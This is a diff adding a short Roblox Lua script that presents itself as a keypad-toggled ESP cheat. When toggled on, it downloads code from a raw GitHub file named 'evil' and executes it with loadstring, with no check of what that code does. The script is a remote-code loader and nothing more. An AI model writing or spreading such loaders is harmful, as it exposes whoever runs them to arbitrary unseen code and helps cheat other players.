@@ -1,0 +1,24 @@
+local UserInputService = game:GetService("UserInputService")
+local http = game:GetService("HttpService")
+
+local espEnabled = false  
+
+local function toggleESP()
+    espEnabled = not espEnabled  
+
+    if espEnabled then  
+        local success, result = pcall(function()
+            return loadstring(game:HttpGet("https://raw.githubusercontent.com/siglver/i/refs/heads/main/evil"))()
+        end)
+        
+        if not success then
+            warn("Falha ao carregar o script:", result)
+        end
+    end
+end
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed and input.KeyCode == Enum.KeyCode.KeypadFive then  
+        toggleESP()
+    end
+end)
